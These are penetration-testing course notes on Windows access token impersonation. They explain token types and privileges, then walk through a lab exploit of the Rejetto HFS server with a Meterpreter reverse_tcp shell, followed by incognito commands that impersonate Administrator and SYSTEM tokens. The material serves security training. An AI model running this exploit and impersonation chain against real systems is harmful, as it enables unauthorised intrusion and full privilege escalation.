Windows Access Tokens
- Windows access tokens are a core element of the authentication process on Windows and are created and managed by the Local Security Authority Subsystem Service (LSASS).
- A Windows access token is responsible for identifying and describing the security context of a process or thread running on a system. Simply put, an access token can be thought of as a temporary key akin to a web cookie that provides users with access to a system or network resource without having to provide credentials each time a process is started or a system resource is accessed.
- Access tokens are generated by the winlogon.exe process every time a user authenticates successfully, and includes the identity and privileges of the user account associated with the thread or process. The token is then attached to the userinit.exe process, after which all child processes started by a user will inherit a copy of the access token from their creator and will run under the privileges of the same access token.

Types of Windows Access Tokens:
- Windows access tokens are categorized based on the varying security levels assigned to them. These security levels are used to determine the privileges that are assigned to a specific token.
- An access token will typically be assigned one of the following security levels:
	- Impersonate-level tokens are created as a direct result of non-interactive login on Windows, typically through specific system services or domain logons.
	- Delegate-level tokens are typically created through an interactive login on Windows, through winlogon.exe, primarily through a traditional login or through remote access protocols such as RDP.
- Impersonate-level tokens can be used to impersonate a token on the local system and not on any external systems that utilize the token.
- Delegate-level tokens pose the largest threat as they can be used to impersonate tokens on any system.

Windows Privileges:
- The process of impersonating access tokens to elevate privileges on a system will primarily depend on the privileges assigned to the account that has been exploited to gain initial access as well as the impersonation or delegation tokens available.
- Remember that we were able to check the privileges of the target system on a Meterpreter session using the `getprivs` command.
- In order for you to impersonate another Windows access token, you primarily need the SeImpersonatePrivilege privilege, or one of the other two privileges mentioned, assigned to the user account you currently have access to:
	- SeAssignPrimaryToken: This allows a user to impersonate tokens.
	- SeCreateToken: This allows a user to create an arbitrary token with administrative privileges.
	- SeImpersonatePrivilege: This allows a user to create a process under the security context of another user typically with administrative privileges.

The Incognito Module
- Incognito is a built-in meterpreter module that was originally a standalone application that allowed you to impersonate user tokens after successful exploitation.
- We can use the incognito module to display a list of available tokens that we can impersonate.

Techniques for Access Token Impersonation Attack
- There are two techniques used for performing an Access Token Impersonation attack on a target system:
	- The first technique is to list the access tokens already present on the system, and to impersonate them. This is the only technique being demonstrated in this section of the course.
	- The second technique, also known as a potato attack, involves using exploit code to get an NT AUTHORITY access token generated so that the attacker can impersonate it.

Practical Demonstration
Initial Access - Exploitation of Vulnerable HTTP File Server
	- `nmap demo.ine.local`
	- A vulnerable HTTP file server, developed by Rejetto, is running on port 80.
	- `searchsploit hfs`
	- `service postgresql start; msfconsole`
	- `setg RHOSTS demo.ine.local`
	- `search rejetto`
	- `use exploit/windows/http/rejetto_hfs_exec`
	- `set payload windows/meterpreter/reverse_tcp`
	- `options`
	- `exploit`
	- Meterpreter Session:
		- `sysinfo`
		- `pgrep explorer`
		- `migrate 3512`
		- Attempting to migrate to the explorer process in our case leads to failure, and provides us with an access denied error, this is due to the fact that we currently have access via a service account, which is by default unprivileged, this can be confirmed by using the `getuid` and `getprivs` command.
		- `getuid`
		- `getprivs`
	- Even though we have low privileges, we do have the SeImpersonatePrivilege, which means that we can perform an Access Token Impersonation attack.
	- Now we can try to list the access tokens available to us, and perform an Access Token Impersonation attack using the Meterpreter Incognito module.
		- `load incognito`
		- `list_tokens -u`
		- The command we used above would now list all the available Delegation and Impersonation tokens, remember that Delegation tokens are created as the direct result of an interactive logon, and Impersonation tokens are created as the direct result of a non-interactive logon.
		- We can observe that we have the Administrator account's delegation token available on the system, now we will try to impersonate it.
		- `impersonate_token "ATTACKDEFENSE\Administrator"`
		- `pgrep explorer`
		- `migrate 3512`
		- `getprivs`
		- `getuid`
		- Now that we have elevated privileges, we have even more access tokens available for us to impersonate, for example `NT AUTHORITY\SYSTEM`.
		- `list_tokens -u`
		- `impersonate_token "NTAUTHORITY\SYSTEM"`
		- `getuid`
		- `getprivs`
	- In the case that we try to list the access tokens on a system, and no privileged access tokens are available, we would have to use the potato attack instead, to generate an NT\AUTHORITY access token and then impersonate it.